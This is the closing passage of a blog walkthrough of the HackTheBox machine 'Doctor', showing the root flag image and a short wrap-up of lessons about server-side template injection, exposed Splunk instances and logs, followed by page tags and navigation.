</code></pre></div></div><p>Eureka!<p><img src="https://shellsharks-images.s3.amazonaws.com/2021/htb-doctor/rootflag.png" alt="ROOT FLAG.txt" /><h1 id="wrap-up">Wrap Up</h1><p>Overall, I think this box was indeed (<em>relatively</em>) easy, as HackTheBox themselves said. Though I must admit, parts of it did prove a little tricky for me in practice. Some of my big takeaways from this box were…<ul><li>SSTI is something I should more regularly account for as part of my normal injection tests.<li>From a defensive perspective, it seems like a good idea to avoid randomly exposing Splunk to untrusted users (if you are an administrator of <em>Splunk</em>)<li>Logs are a great place to hunt for loot. In fact, a little clue related to the log portion of this box is hidden in plain-sight. Thanks to one of my coworkers, the (very) subtle clue, hidden inside the artwork for the box itself, hints at this very thing (take notice of the “log” and the “injection”). Take a look for yourself and revel in it’s unnerving elegance.</ul><p><img src="https://shellsharks-images.s3.amazonaws.com/2021/htb-doctor/loginjection.png" alt="HTB Doctor" /></div></article><hr class="fin"><div id="poststats" class="containbox" style="margin: auto;"> <span class="time"><i class="ph ph-calendar-dot"></i> Published: <span class="dt-published">February 6, 2021</span></span> <a class="u-url u-uid" href></a><br> <span class='time'><i class="ph ph-calendar-dot"></i> Updated: <span class="dt-updated">April 19, 2021</span></span><br/> <span class="categories"><i class="ph ph-tag"></i> Tags: <span class="primarybg" style="border-radius:15px;padding:0px 5px 0px 5px;"><a class="p-category" href="/tags?tag=infosec">#infosec</a></span> <span class="primarybg" style="border-radius:15px;padding:0px 5px 0px 5px;"><a class="p-category" href="/tags?tag=hackthebox">#hackthebox</a></span> <span class="primarybg" style="border-radius:15px;padding:0px 5px 0px 5px;"><a class="p-category" href="/tags?tag=pentesting">#pentesting</a></span> <span class="primarybg" style="border-radius:15px;padding:0px 5px 0px 5px;"><a class="p-category" href="/tags?tag=appsec">#appsec</a></span> <span class="primarybg" style="border-radius:15px;padding:0px 5px 0px 5px;"><a class="p-category" href="/tags?tag=network">#network</a></span> <span class="primarybg" style="border-radius:15px;padding:0px 5px 0px 5px;"><a class="p-category" href="/tags?tag=red">#red</a></span> <span class="primarybg" style="border-radius:15px;padding:0px 5px 0px 5px;"><a class="p-category" href="/tags?tag=python">#python</a></span> <span class="primarybg" style="border-radius:15px;padding:0px 5px 0px 5px;"><a class="p-category" href="/tags?tag=nmap">#nmap</a></span> <span class="primarybg" style="border-radius:15px;padding:0px 5px 0px 5px;"><a class="p-category" href="/tags?tag=technical">#technical</a></span> </span><br/> <span class="time"><i class="ph ph-pencil"></i> Word count: 1948</span> <span class="p-summary" style="display:none;">A walkthrough of pwning the HackTheBox machine "Doctor".</span></div><br/><div class="PageNavigation"> <a class="prev" style="margin-right: 2em;" href="/htb-delivery#title">&laquo; HackTheBox: Delivery</a><div style="float:right;"><a class="next" href="/herman-miller-logitech-embody-review#title" style="margin-right:0;">Herman Miller Logitech Embody Review &raquo;</a></div></div></main><aside class="container_item"></aside><footer class="container_item"> <center><span style="color:var(--light-font-color); font-size:.8em; font-style:italic; position:relative; top:25px;">Brought to you with <i class="ph-fill ph-heart-straight" style="color:var(--accent-color);"></i> by <a href="https://shellsharks.com/about">Shellsharks</a></span></center> <center> <img id="sharkfooter" src="/assets/img/sharks-circling.png" alt="Circling Sharks" style="width:150px;"></img> </center></footer></div><noscript><div class="panel" align="center" style="font-weight:bold;"><h1>Please enable JavaScript.</h1></div></noscript> <script src="/assets/js/themeswitcher.js"></script>
